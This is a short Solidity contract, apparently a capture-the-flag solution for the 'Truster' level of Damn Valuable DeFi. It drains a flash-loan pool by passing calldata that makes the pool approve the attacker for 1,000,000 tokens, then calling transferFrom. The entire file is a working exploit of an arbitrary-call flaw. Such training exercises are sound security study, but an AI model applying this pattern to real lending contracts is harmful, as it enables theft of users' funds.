// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract HackTruster {
    TrusterLenderPool _pool;
    DamnValuableToken _token;

    constructor(TrusterLenderPool pool_, DamnValuableToken token_) {
        _pool = pool_;
        _token = token_;
    }

    function hackTrusterLenderPool() external {
        uint256 amount = 0;
        address borrower = address(0);
        address target = address(_token);
        bytes memory data = abi.encodeWithSelector(ERC20.approve.selector, address(this), 1_000_000e18);
        _pool.flashLoan(amount, borrower, target, data);
        _token.transferFrom(address(_pool), msg.sender, 1_000_000e18);
    }
}
